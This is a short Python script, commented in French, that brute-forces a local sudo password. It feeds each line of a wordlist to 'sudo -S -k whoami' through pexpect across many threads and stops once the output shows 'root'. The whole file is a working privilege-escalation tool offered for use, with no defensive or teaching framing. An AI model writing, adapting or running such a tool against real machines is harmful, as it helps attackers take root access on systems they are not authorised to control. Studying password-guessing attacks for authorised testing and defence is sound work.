import pexpect
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import multiprocessing

def test_password(pw, index):
    print(f"[{index}] Test mot de passe: {pw}")
    child = None
    try:
        child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
        child.sendline(pw)
        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.1)  # Timeout augmenté
        if child.after == "root":
            print(f"✅ Mot de passe trouvé : {pw} [{index}]")
            os._exit(0)
    except Exception as e:
        # Optionnel: décommenter pour debug
        # print(f"Erreur avec {pw}: {e}")
        return None
    finally:
        if child and child.isalive():
            child.close()

def main():
    parser = argparse.ArgumentParser(description="Bruteforce sudo using a wordlist.")
    parser.add_argument("--wordlist", required=True, help="Chemin vers le fichier wordlist")
    args = parser.parse_args()

    with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    max_workers = multiprocessing.cpu_count() * 2
    print(f"Lancement du bruteforce avec {max_workers} threads...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_password, pw, i+1): pw for i, pw in enumerate(passwords)}
        
        for future in as_completed(futures):
            future.result()
    
    print("Aucun mot de passe trouvé.")

if __name__ == "__main__":
    main()
